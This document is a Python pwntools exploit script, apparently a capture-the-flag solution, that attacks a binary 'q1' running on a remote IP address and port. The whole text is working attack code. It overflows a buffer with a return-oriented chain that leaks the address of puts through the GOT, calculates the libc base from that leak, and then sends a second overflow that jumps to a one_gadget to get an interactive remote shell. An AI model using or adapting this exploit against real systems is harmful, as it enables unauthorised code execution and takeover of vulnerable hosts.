#!/usr/bin/python
from pwn import *
from time import sleep
context(arch="amd64",os="linux")
#p = process('./q1')
p = remote('68.183.158.95',8989)
libc = ELF('./libc.so.6')
bin = ELF('./q1')
puts_got = bin.got['puts']
puts_plt = bin.plt['puts']
payload = "A"*22
payload += p64(bin.search(asm('pop rdi;ret')).next())
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(bin.symbols['main'])
sleep(1)
log.success("sending payload")
p.sendline(payload)
p.recvuntil('Again\n',timeout=1)
leak = u64(p.recvline().strip()+"\x00"*2)
log.success("leaked puts at: "+hex(leak))
lba = leak - libc.symbols['puts']
log.success("libc base address calculated at: "+hex(lba))
sleep(1)
payload = "A"*22
payload += p64(0x45216+lba) #one_gadget
p.sendline(payload)
p.interactive()
